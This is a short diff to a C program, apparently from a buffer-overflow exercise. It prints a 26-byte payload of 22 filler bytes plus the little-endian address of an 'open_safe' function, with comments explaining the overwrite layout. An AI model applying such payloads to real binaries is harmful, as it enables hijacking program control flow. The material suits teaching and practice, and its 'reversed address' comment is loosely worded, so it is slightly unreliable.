@@ -4,9 +4,17 @@
 int main() {
   int i;
 
-  char addr[] = "\x98\x83\x04\x08";
+  // Uncomment to add 22 random bytes
+  // printf("\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01");
   
-  for (i = 0; i<8; i++) {
-    printf(addr);
+  for (i = 0; i < 1; i++)  
+  { 
+    printf("%c%c%c%c",'\x96','\x11','\x40','\x00');
   }
 }
+
+// To successfully perform the buffer overflow flood 26 bytes as such:
+//
+// -- First 22 bytes: any random value (just needs to flood)
+// -- Last 4 bytes: strictly the address of the open_safe function reversed
+// -- -- this means, the original address is 0x00401196, so the reversed address is 0x96114000
